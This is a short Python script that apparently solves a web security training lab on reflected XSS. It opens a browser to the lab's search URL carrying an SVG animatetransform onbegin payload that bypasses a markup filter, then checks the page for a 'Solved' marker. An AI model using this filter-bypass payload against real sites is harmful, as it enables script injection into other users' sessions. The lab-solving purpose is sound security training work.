import requests
import argparse
import webbrowser as wb
from time import sleep

parser = argparse.ArgumentParser(description='Solves the following Lab: Reflected XSS with some SVG markup allowed')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

wb.open("https://" + lab.id + '.h1-web-security-academy.net/?search=<svg><animatetransform+onbegin%3Dalert%28%27XSS%27%29>')

sleep(5)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".h1-web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")